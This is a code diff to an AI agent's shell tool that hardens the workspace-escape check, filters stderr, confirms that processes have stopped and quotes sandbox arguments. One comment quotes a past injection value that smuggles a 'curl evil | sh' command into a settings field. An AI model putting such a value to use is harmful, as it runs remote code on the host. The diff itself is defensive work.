@@ -4,7 +4,14 @@ import { mkdtemp, rm, stat, unlink } from "fs/promises";
 import os from "os";
 import path from "path";
 import { runCommand } from "../exec/command";
-import { buildShellInvocation, killProcessTree, powerShellParseHint, spawnOptions, stopOrphansOf } from "../exec/shell";
+import {
+  buildShellInvocation,
+  createShellErrorFilter,
+  killProcessTree,
+  powerShellParseHint,
+  spawnOptions,
+  stopOrphansOf,
+} from "../exec/shell";
 import { executeEventHooks } from "../hooks/index";
 import type { CwdChangedHookInput } from "../hooks/types";
 import type { ToolResult } from "../types/index";
@@ -118,7 +125,7 @@ export class BashTool {
           // let the agent read and write anywhere on the machine (seen live 2026-09-17: a model
           // ran `cd ../../../` and wrote artifacts into an unrelated repository).
           const escapePath = path.relative(this.rootCwd, nextCwd);
-          if (escapePath.startsWith("..") || path.isAbsolute(escapePath)) {
+          if (escapePath === ".." || escapePath.startsWith(`..${path.sep}`) || path.isAbsolute(escapePath)) {
             return {
               success: false,
               error: `Cannot change directory outside the workspace root (${this.rootCwd}). Use paths relative to the workspace instead.`,
@@ -270,8 +277,14 @@ export class BashTool {
         spawnOptions(this.cwd, { ...process.env, FORCE_COLOR: "0" }),
       );
 
-      child.stdout?.pipe(logStream);
-      child.stderr?.pipe(logStream);
+      // A failing background command wrote PowerShell's raw "#< CLIXML <Objs ..." to its log: stderr goes through the
+      // same filter a foreground command's does.
+      const errorFilter = createShellErrorFilter();
+      child.stdout?.pipe(logStream, { end: false });
+      child.stderr?.on("data", (chunk: Buffer | string) => {
+        const cleaned = errorFilter.push(chunk.toString());
+        if (cleaned) logStream.write(cleaned);
+      });
 
       const entry: BackgroundProcess = {
         id,
@@ -288,6 +301,8 @@ export class BashTool {
       child.on("exit", (code) => {
         entry.alive = false;
         entry.exitCode = code;
+        const rest = errorFilter.flush();
+        if (rest) logStream.write(rest);
         logStream.end();
       });
 
@@ -370,6 +385,13 @@ export class BashTool {
 
     try {
       await stopTree(entry);
+      // taskkill can fail (access denied, a protected process): "stopped" was reported whatever happened.
+      if (isProcessRunning(entry.pid)) {
+        return {
+          success: false,
+          output: `Process ${id} (pid ${entry.pid}) is still running after the stop was tried. Stop it from a shell (Stop-Process -Id ${entry.pid} -Force, or kill -9 ${entry.pid}) or ask the person to.`,
+        };
+      }
 
       return {
         success: true,
@@ -520,6 +542,18 @@ export function parseStandaloneCd(command: string): string | null {
  * shell left both servers running on port 8080, and their hold on the shell's output kept a finished headless run
  * from exiting for 25 minutes.
  */
+/** Whether a process with this id exists now (signal 0 only asks; it sends nothing). */
+function isProcessRunning(pid: number): boolean {
+  if (!pid || pid <= 0) return false;
+  try {
+    process.kill(pid, 0);
+    return true;
+  } catch (error) {
+    // EPERM means it exists but is not ours to signal; ESRCH means it is gone.
+    return (error as NodeJS.ErrnoException).code === "EPERM";
+  }
+}
+
 async function stopTree(entry: BackgroundProcess): Promise<void> {
   const exited = new Promise<void>((resolve) => {
     if (!entry.alive) resolve();
@@ -550,22 +584,26 @@ function formatAge(start: Date): string {
 export function wrapCommandForShuru(cwd: string, command: string, settings: SandboxSettings = {}): string {
   const parts: string[] = ["shuru", "run"];
 
-  if (settings.cpus) parts.push("--cpus", String(settings.cpus));
-  if (settings.memory) parts.push("--memory", String(settings.memory));
-  if (settings.diskSize) parts.push("--disk-size", String(settings.diskSize));
+  // These values come from settings files, project ones included, and are joined into a host shell line: each is
+  // quoted unless it is plainly safe (review 2026-10-07: `--from "x; curl evil | sh"` ran on the host).
+  const arg = (value: string | number): string =>
+    /^[A-Za-z0-9_./:@=,-]+$/.test(String(value)) ? String(value) : shellQuote(String(value));
+  if (settings.cpus) parts.push("--cpus", arg(settings.cpus));
+  if (settings.memory) parts.push("--memory", arg(settings.memory));
+  if (settings.diskSize) parts.push("--disk-size", arg(settings.diskSize));
   if (settings.allowNet) parts.push("--allow-net");
   if (settings.allowedHosts) {
-    for (const host of settings.allowedHosts) parts.push("--allow-host", host);
+    for (const host of settings.allowedHosts) parts.push("--allow-host", arg(host));
   }
   if (settings.ports) {
-    for (const port of settings.ports) parts.push("-p", port);
+    for (const port of settings.ports) parts.push("-p", arg(port));
   }
   if (settings.secrets) {
     for (const s of settings.secrets) {
-      parts.push("--secret", `${s.name}=${s.fromEnv}@${s.hosts.join(",")}`);
+      parts.push("--secret", arg(`${s.name}=${s.fromEnv}@${s.hosts.join(",")}`));
     }
   }
-  if (settings.from) parts.push("--from", settings.from);
+  if (settings.from) parts.push("--from", arg(settings.from));
 
   const mountArg = `${cwd}:/workspace`;
   parts.push("--mount", shellQuote(mountArg));
